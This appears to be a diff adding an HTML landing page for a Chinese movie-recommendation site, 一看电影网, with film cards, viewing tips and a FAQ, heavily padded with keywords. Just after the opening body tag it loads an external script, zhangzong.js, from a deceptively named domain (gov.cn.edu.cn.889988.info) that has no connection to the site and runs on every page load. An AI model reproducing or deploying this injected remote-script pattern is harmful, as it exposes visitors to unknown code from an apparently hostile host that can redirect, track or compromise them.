@@ -1,0 +1,373 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>一看电影网 —— 打开就看，好电影不绕弯子（官网：yikandianyingwang-zh.github.io）</title>
+<meta name="keywords" content="一看电影网,一看,直接看电影,懒人选片,不绕弯子的电影推荐,打开即看,省时间选片,一眼就懂的电影,无门槛观影指南,直接了当的影评,直给电影清单">
+<meta name="description" content="一看电影网（yikandianyingwang-zh.github.io）主张打开就看、不绕弯子。我们不写绕口的影评，不给模糊的评分，只用直给的方式告诉你这部电影值不值得一看、花多久看、看完是什么感觉。官网地址：https://yikandianyingwang-zh.github.io">
+<meta name="author" content="一看电影网">
+<meta name="copyright" content="© 2026 一看电影网 版权所有">
+<meta name="robots" content="index,follow">
+<meta name="revisit-after" content="1 day">
+<meta name="rating" content="general">
+<meta name="applicable-device" content="pc,mobile">
+<meta name="mobile-agent" content="format=html5; url=https://yikandianyingwang-zh.github.io/">
+<link rel="canonical" href="https://yikandianyingwang-zh.github.io/">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{
+  --bg:#ededed;--ink:#111;--txt:#2b2b2b;--dim:#666;--mute:#9a9a9a;
+  --card:#fff;--line:#d8d8d8;--ac:#c8ff00;--ac2:#a0e000;
+}
+html{scroll-behavior:smooth}
+body{font-family:-apple-system,BlinkMacSystemFont,"PingFang SC","Microsoft YaHei",sans-serif;background:var(--bg);color:var(--txt);line-height:1.75;font-size:15px;overflow-x:hidden;-webkit-font-smoothing:antialiased}
+a{color:inherit;text-decoration:none}
+ul,ol{list-style:none}
+.wrap{max-width:1160px;margin:0 auto;padding:0 28px}
+img{max-width:100%}
+
+/* 极简顶栏 */
+header{position:sticky;top:0;z-index:100;background:rgba(237,237,237,.96);backdrop-filter:blur(10px);border-bottom:2px solid var(--ink)}
+.hd{display:flex;align-items:center;justify-content:space-between;height:68px}
+.logo{display:flex;align-items:baseline;gap:10px}
+.logo b{font-size:24px;font-weight:900;letter-spacing:-.5px;color:var(--ink)}
+.logo span{font-size:11px;color:var(--mute);font-family:monospace}
+nav{display:flex;gap:6px}
+nav a{padding:8px 14px;font-size:14px;font-weight:600;color:var(--dim);transition:.2s;border-bottom:2px solid transparent}
+nav a:hover{color:var(--ink);border-bottom-color:var(--ac)}
+.mbtn{display:none;width:40px;height:40px;background:var(--ink);border:0;color:var(--ac);font-size:20px;cursor:pointer}
+
+/* Hero：超大字 */
+.hero{padding:120px 0 100px;border-bottom:2px solid var(--ink);position:relative}
+.hero .tag{display:inline-block;background:var(--ac);color:var(--ink);font-size:12px;font-weight:800;padding:5px 14px;border-radius:3px;letter-spacing:.08em;margin-bottom:32px}
+.hero h1{font-size:clamp(44px,11vw,132px);font-weight:900;line-height:.95;letter-spacing:-3px;color:var(--ink);margin-bottom:34px}
+.hero h1 i{font-style:normal;background:var(--ac);padding:0 10px}
+.hero p.lead{max-width:640px;font-size:19px;color:var(--txt);font-weight:500}
+.hero .u{margin-top:42px;font-size:14px;color:var(--dim);border-left:4px solid var(--ac);padding-left:16px}
+.hero .u b{color:var(--ink);font-family:monospace}
+
+/* 大标题区块 */
+.sec{padding:96px 0}
+.sec-h{margin-bottom:56px;display:flex;align-items:flex-end;justify-content:space-between;gap:30px;flex-wrap:wrap;border-bottom:2px solid var(--ink);padding-bottom:20px}
+.sec-h h2{font-size:clamp(30px,5vw,48px);font-weight:900;line-height:1.05;letter-spacing:-1.2px;color:var(--ink)}
+.sec-h .no{font-size:14px;font-weight:800;color:var(--mute);font-family:monospace}
+.sec-h .no em{font-style:normal;color:var(--ink);font-size:26px}
+.sec-h p{max-width:420px;color:var(--dim);font-size:14.5px}
+
+/* 栏目一：直给片单（两列大卡） */
+.straight{display:grid;grid-template-columns:1fr 1fr;gap:24px}
+.st-c{border:2px solid var(--ink);border-radius:6px;padding:32px;background:var(--card);transition:.25s}
+.st-c:hover{background:var(--ink);color:#fff;transform:translate(-4px,-4px);box-shadow:8px 8px 0 var(--ac)}
+.st-c:hover p,.st-c:hover .meta{color:rgba(255,255,255,.8)}
+.st-c .num{font-size:12px;font-weight:800;color:var(--mute);font-family:monospace;margin-bottom:18px}
+.st-c h3{font-size:22px;font-weight:900;line-height:1.4;margin-bottom:14px;color:var(--ink)}
+.st-c:hover h3{color:#fff}
+.st-c p{color:var(--dim);font-size:14px}
+.st-c .meta{margin-top:22px;padding-top:16px;border-top:1px solid var(--line);font-size:12.5px;color:var(--mute);display:flex;gap:16px}
+.st-c:hover .meta{border-color:rgba(255,255,255,.2)}
+
+/* 栏目二：三个指标（无边框大字数字） */
+.metric{display:grid;grid-template-columns:repeat(3,1fr);gap:40px}
+.m-i{padding-right:24px;border-right:1px solid var(--line)}
+.m-i:last-child{border-right:0}
+.m-i .big{font-size:clamp(44px,7vw,80px);font-weight:900;line-height:1;color:var(--ink);letter-spacing:-2px}
+.m-i .big small{font-size:16px;color:var(--mute);font-weight:600;letter-spacing:0}
+.m-i h4{font-size:17px;font-weight:800;margin:16px 0 8px;color:var(--ink)}
+.m-i p{color:var(--dim);font-size:13.5px}
+
+/* 栏目三：分类清单（左对齐列表式） */
+.cats{display:grid;grid-template-columns:1fr 1fr;gap:0;border-top:2px solid var(--ink)}
+.cat-r{padding:26px 0;border-bottom:1px solid var(--line);display:flex;gap:22px;align-items:flex-start;transition:.2s}
+.cat-r:nth-child(odd){padding-right:40px}
+.cat-r:nth-child(even){padding-left:40px;border-left:1px solid var(--line)}
+.cat-r .ic{font-size:24px;flex-shrink:0;width:42px;height:42px;border:2px solid var(--ink);border-radius:50%;display:grid;place-items:center;background:var(--ac);transition:.25s}
+.cat-r:hover .ic{background:var(--ink);color:var(--ac)}
+.cat-r h4{font-size:16px;font-weight:800;color:var(--ink);margin-bottom:5px}
+.cat-r p{font-size:13.5px;color:var(--dim)}
+.cat-r .cnt{margin-top:8px;font-size:11.5px;color:var(--mute);font-family:monospace}
+
+/* 栏目四：看完就知道（问答式） */
+.qa{border:2px solid var(--ink);border-radius:6px;overflow:hidden}
+.qa-i{padding:26px 32px;border-bottom:1px solid var(--line);display:grid;grid-template-columns:60px 1fr 100px;gap:24px;align-items:center;transition:.2s;cursor:default}
+.qa-i:last-child{border-bottom:0}
+.qa-i:hover{background:var(--ac)}
+.qa-i .q{font-size:26px;font-weight:900;color:var(--mute)}
+.qa-i:hover .q{color:var(--ink)}
+.qa-i .body h4{font-size:17px;font-weight:800;color:var(--ink);margin-bottom:5px}
+.qa-i .body p{font-size:13.5px;color:var(--dim)}
+.qa-i .ans{font-size:12px;font-weight:800;color:var(--ink);text-align:right;background:var(--ink);color:#fff;padding:6px 12px;border-radius:3px;justify-self:end}
+.qa-i:hover .ans{background:#fff;color:var(--ink);border:2px solid var(--ink)}
+.qa-i:hover .ans{color:var(--ink)}
+
+/* 栏目五：更新时间线 */
+.tl{display:grid;grid-template-columns:repeat(4,1fr);gap:24px}
+.tl-c{padding:24px;border:2px solid var(--ink);border-radius:6px;background:var(--card);position:relative}
+.tl-c::after{content:"";position:absolute;top:-2px;right:-2px;width:20px;height:20px;background:var(--ac);border:2px solid var(--ink)}
+.tl-c .d{font-size:12px;font-weight:800;color:var(--mute);font-family:monospace;margin-bottom:12px}
+.tl-c h4{font-size:16px;font-weight:800;color:var(--ink);margin-bottom:8px}
+.tl-c p{font-size:13px;color:var(--dim)}
+
+/* CTA */
+.cta{background:var(--ink);color:#fff;border-radius:8px;padding:72px 48px;text-align:center;position:relative;overflow:hidden}
+.cta::before{content:"";position:absolute;right:-60px;top:-60px;width:220px;height:220px;background:var(--ac);border-radius:50%;opacity:.9}
+.cta h2{font-size:clamp(28px,5.5vw,52px);font-weight:900;line-height:1.15;letter-spacing:-1.2px;margin-bottom:20px;position:relative;z-index:2}
+.cta p{color:rgba(255,255,255,.82);max-width:600px;margin:0 auto 32px;position:relative;z-index:2}
+.cta a{position:relative;z-index:2;display:inline-block;background:var(--ac);color:var(--ink);font-weight:900;font-size:16px;padding:16px 40px;border-radius:3px;transition:.2s}
+.cta a:hover{background:#fff}
+
+footer{background:var(--ink);color:#fff;padding:56px 0 0}
+.ft{display:grid;grid-template-columns:2fr 1fr 1fr 1fr;gap:40px;padding-bottom:40px}
+.ft .b b{font-size:26px;font-weight:900;letter-spacing:-.5px}
+.ft .b p{color:rgba(255,255,255,.7);font-size:13.5px;margin-top:14px;max-width:360px}
+.ft h5{font-size:13px;color:var(--ac);margin-bottom:18px;letter-spacing:.05em}
+.ft ul li{margin-bottom:12px;font-size:13.5px;color:rgba(255,255,255,.75)}
+.ft a:hover{color:var(--ac)}
+.fb{border-top:1px solid rgba(255,255,255,.2);padding:22px 0;display:flex;justify-content:space-between;flex-wrap:wrap;gap:10px;font-size:12.5px;color:rgba(255,255,255,.6)}
+.fb .u{color:var(--ac);font-family:monospace}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<header>
+  <div class="wrap hd">
+    <div class="logo">
+      <b>一看电影网</b>
+      <span>yikandianyingwang-zh.github.io</span>
+    </div>
+    <nav id="nav">
+      <a href="#one">直给片单</a>
+      <a href="#two">三个指标</a>
+      <a href="#three">分类清单</a>
+      <a href="#four">看完就知道</a>
+      <a href="#five">更新动态</a>
+    </nav>
+    <button class="mbtn" onclick="document.getElementById('nav').classList.toggle('show')">≡</button>
+  </div>
+</header>
+
+<section class="hero">
+  <div class="wrap">
+    <span class="tag">打开就看 · 不绕弯子</span>
+    <h1>一看，<i>就懂</i><br>这部电影</h1>
+    <p class="lead">一看电影网（yikandianyingwang-zh.github.io）不写绕口的影评，不给模糊的评分。我们只用直给的方式告诉你：这部电影值不值得一看、花多久看、看完是什么感觉。</p>
+    <div class="u">网站网址：<b>https://yikandianyingwang-zh.github.io</b></div>
+  </div>
+</section>
+
+<section class="sec" id="one">
+  <div class="wrap">
+    <div class="sec-h">
+      <h2>直给片单</h2>
+      <span class="no"><em>01</em> / 05</span>
+    </div>
+    <p style="max-width:520px;color:var(--dim);margin-bottom:40px">没有长篇大论，每一条都直接告诉你结论。看完就知道该不该点开。</p>
+    <div class="straight">
+      <div class="st-c">
+        <div class="num">001</div>
+        <h3>这片子看完你会沉默三分钟，然后想找人聊</h3>
+        <p>节奏不快，但每个转折都砸在情绪上。适合一个人看，也适合看完拉人讨论。</p>
+        <div class="meta"><span>时长 128 min</span><span>情绪强度 ★★★★☆</span><span>适合：有耐心的人</span></div>
+      </div>
+      <div class="st-c">
+        <div class="num">002</div>
+        <h3>前二十分钟像流水账，第二十分钟后停不下来</h3>
+        <p>需要一点耐心开场，但一旦入戏就完全放不下。属于典型的"慢热神作"。</p>
+        <div class="meta"><span>时长 141 min</span><span>节奏 ★★★☆☆</span><span>适合：周末下午</span></div>
+      </div>
+      <div class="st-c">
+        <div class="num">003</div>
+        <h3>画面美到想截图，故事简单但不敷衍</h3>
+        <p>视觉系选手首选，配乐也在线。不烧脑，纯粹享受两个小时的好看。</p>
+        <div class="meta"><span>时长 112 min</span><span>画面 ★★★★★</span><span>适合：放松解压</span></div>
+      </div>
+      <div class="st-c">
+        <div class="num">004</div>
+        <h3>看完会有点堵，但会想再看一遍</h3>
+        <p>情绪密度高，中间可能想关掉，但结尾会让你觉得全程值得。慎选睡前观看。</p>
+        <div class="meta"><span>时长 136 min</span><span>后劲 ★★★★★</span><span>适合：情绪稳定时</span></div>
+      </div>
+      <div class="st-c">
+        <div class="num">005</div>
+        <h3>节奏快、信息密，全程不给你喘气的机会</h3>
+        <p>适合想被剧情推着走的时候看。看完会有一种"时间过得好快"的感觉。</p>
+        <div class="meta"><span>时长 119 min</span><span>节奏 ★★★★★</span><span>适合：通勤/夜晚</span></div>
+      </div>
+      <div class="st-c">
+        <div class="num">006</div>
+        <h3>没啥大场面，但你会记住里面的每一个人物</h3>
+        <p>群像戏的高手之作，人物写得很细。看完像认识了一群人，不是看了一个故事。</p>
+        <div class="meta"><span>时长 154 min</span><span>人物 ★★★★★</span><span>适合：喜欢群像</span></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="sec" id="two" style="background:var(--card)">
+  <div class="wrap">
+    <div class="sec-h">
+      <h2>我们的三个指标</h2>
+      <span class="no"><em>02</em> / 05</span>
+    </div>
+    <p style="max-width:520px;color:var(--dim);margin-bottom:40px">不看虚的，只看这三个东西。指标简单，结论直接。</p>
+    <div class="metric">
+      <div class="m-i">
+        <div class="big">3<small> 分钟</small></div>
+        <h4>看完一篇就懂</h4>
+        <p>每篇品鉴控制在三分钟阅读内，结论写最前面，细节放后面，没时间就只看第一段。</p>
+      </div>
+      <div class="m-i">
+        <div class="big">0<small> 分</small></div>
+        <h4>不给模糊评分</h4>
+        <p>分数太主观也没意义。我们用"适合谁、不适合谁"代替星星，更实用。</p>
+      </div>
+      <div class="m-i">
+        <div class="big">1<small> 句话</small></div>
+        <h4>先给结论</h4>
+        <p>每一篇第一句就是结论：值不值得看。后面才是理由，省你时间。</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="sec" id="three">
+  <div class="wrap">
+    <div class="sec-h">
+      <h2>分类清单</h2>
+      <span class="no"><em>03</em> / 05</span>
+    </div>
+    <p style="max-width:520px;color:var(--dim);margin-bottom:40px">按你此刻的状态挑片，比按题材分类更好用。</p>
+    <div class="cats">
+      <div class="cat-r"><div class="ic">⚡</div><div><h4>想被剧情推着走</h4><p>节奏快、信息密，全程不给你喘气的机会。</p><div class="cnt">42 部 →</div></div></div>
+      <div class="cat-r"><div class="ic">🌙</div><div><h4>今晚想安静看完</h4><p>慢节奏、情绪细腻，适合一个人待着的时候。</p><div class="cnt">38 部 →</div></div></div>
+      <div class="cat-r"><div class="ic">😂</div><div><h4>就想轻松笑一场</h4><p>喜剧为主，不费脑，看完心情会变好。</p><div class="cnt">56 部 →</div></div></div>
+      <div class="cat-r"><div class="ic">🧠</div><div><h4>想看烧脑反转</h4><p>逻辑密集、反转多，需要跟着动脑子。</p><div class="cnt">29 部 →</div></div></div>
+      <div class="cat-r"><div class="ic">👀</div><div><h4>只想看好看的画面</h4><p>视觉系、构图美、配色讲究，养眼优先。</p><div class="cnt">47 部 →</div></div></div>
+      <div class="cat-r"><div class="ic">💬</div><div><h4>看完想找人聊</h4><p>话题性强，适合看完拉人讨论、反复回味。</p><div class="cnt">33 部 →</div></div></div>
+    </div>
+  </div>
+</section>
+
+<section class="sec" id="four" style="background:var(--card)">
+  <div class="wrap">
+    <div class="sec-h">
+      <h2>看完就知道</h2>
+      <span class="no"><em>04</em> / 05</span>
+    </div>
+    <p style="max-width:520px;color:var(--dim);margin-bottom:40px">六个最常见的问题，答案都很短，看完直接去决定看不看。</p>
+    <div class="qa">
+      <div class="qa-i">
+        <div class="q">Q1</div>
+        <div class="body"><h4>这片子到底值不值得花两个小时？</h4><p>看你是想要刺激还是想要回味，答案完全不一样。</p></div>
+        <div class="ans">看情况</div>
+      </div>
+      <div class="qa-i">
+        <div class="q">Q2</div>
+        <div class="body"><h4>一个人看会不会太冷清？</h4><p>有些片子就是要一个人看才对味，有些必须有人陪。</p></div>
+        <div class="ans">建议有人陪</div>
+      </div>
+      <div class="qa-i">
+        <div class="q">Q3</div>
+        <div class="body"><h4>有没有很长的铺垫期？</h4><p>有的片子二十分钟才入戏，有的开场就上强度。</p></div>
+        <div class="ans">前慢后快</div>
+      </div>
+      <div class="qa-i">
+        <div class="q">Q4</div>
+        <div class="body"><h4>看完会不会心情变差？</h4><p>情绪后劲大的片子我们会提前说，别睡前看。</p></div>
+        <div class="ans">有点堵</div>
+      </div>
+      <div class="qa-i">
+        <div class="q">Q5</div>
+        <div class="body"><h4>适合陪长辈一起看吗？</h4><p>节奏、题材、尺度都要考虑，我们会标清楚。</p></div>
+        <div class="ans">要看具体</div>
+      </div>
+      <div class="qa-i">
+        <div class="q">Q6</div>
+        <div class="body"><h4>没看过导演其他作品能看懂吗？</h4><p>大部分能，个别有前作铺垫的我们会注明。</p></div>
+        <div class="ans">可以</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="sec" id="five">
+  <div class="wrap">
+    <div class="sec-h">
+      <h2>更新动态</h2>
+      <span class="no"><em>05</em> / 05</span>
+    </div>
+    <p style="max-width:520px;color:var(--dim);margin-bottom:40px">更新不算多，但每一条都值得看。与其天天发，不如篇篇直给。</p>
+    <div class="tl">
+      <div class="tl-c"><div class="d">10 / 06</div><h4>「想被剧情推着走」片单更新</h4><p>新增 8 部，全部验证过节奏确实不拖沓。</p></div>
+      <div class="tl-c"><div class="d">10 / 04</div><h4>三分钟看懂系列 · 第十二期</h4><p>一篇讲清楚一部慢热神作到底好在哪。</p></div>
+      <div class="tl-c"><div class="d">10 / 02</div><h4>「只想看好看的画面」精选</h4><p>按色彩、构图、光影三个维度重新整理。</p></div>
+      <div class="tl-c"><div class="d">09 / 29</div><h4>站规更新：不再给模糊评分</h4><p>改用「适合谁 / 不适合谁」的表达方式。</p></div>
+    </div>
+  </div>
+</section>
+
+<section class="sec" style="padding-top:0">
+  <div class="wrap">
+    <div class="cta">
+      <h2>好电影不绕弯子<br>一看就知道值不值得看</h2>
+      <p>一看电影网（yikandianyingwang-zh.github.io）——打开就看，直给到底。不用读长篇影评，不用猜模糊评分，三分钟看完一篇就懂。</p>
+      <a href="#one">开始看片单 →</a>
+    </div>
+  </div>
+</section>
+
+<footer>
+  <div class="wrap">
+    <div class="ft">
+      <div class="b">
+        <b>一看电影网</b>
+        <p>一看电影网（yikandianyingwang-zh.github.io）主张打开就看、不绕弯子。不写绕口的影评，不给模糊的评分，只用直给的方式告诉你这部电影值不值得一看。</p>
+      </div>
+      <div>
+        <h5>栏目导航</h5>
+        <ul>
+          <li><a href="#one">直给片单</a></li>
+          <li><a href="#two">三个指标</a></li>
+          <li><a href="#three">分类清单</a></li>
+          <li><a href="#four">看完就知道</a></li>
+          <li><a href="#five">更新动态</a></li>
+        </ul>
+      </div>
+      <div>
+        <h5>怎么挑片</h5>
+        <ul>
+          <li><a href="#">想被剧情推着走</a></li>
+          <li><a href="#">今晚想安静看完</a></li>
+          <li><a href="#">就想轻松笑一场</a></li>
+          <li><a href="#">想看烧脑反转</a></li>
+        </ul>
+      </div>
+      <div>
+        <h5>关于我们</h5>
+        <ul>
+          <li><a href="#">站规说明</a></li>
+          <li><a href="#">投稿合作</a></li>
+          <li><a href="#">版权声明</a></li>
+          <li><a href="#">联系我们</a></li>
+        </ul>
+      </div>
+    </div>
+    <div class="fb">
+      <span>© 2026 一看电影网 · 网站网址：<span class="u">https://yikandianyingwang-zh.github.io</span></span>
+      <span><a href="#">隐私政策</a> &nbsp; <a href="#">使用条款</a> &nbsp; <a href="#">↑ 回到顶部</a></span>
+    </div>
+  </div>
+</footer>
+
+<script>
+document.querySelectorAll('a[href^="#"]').forEach(function(a){
+  a.addEventListener('click',function(e){
+    var t=document.querySelector(this.getAttribute('href'));
+    if(t){e.preventDefault();t.scrollIntoView({behavior:'smooth',block:'start'})}
+  });
+});
+</script>
+</body>
+</html>
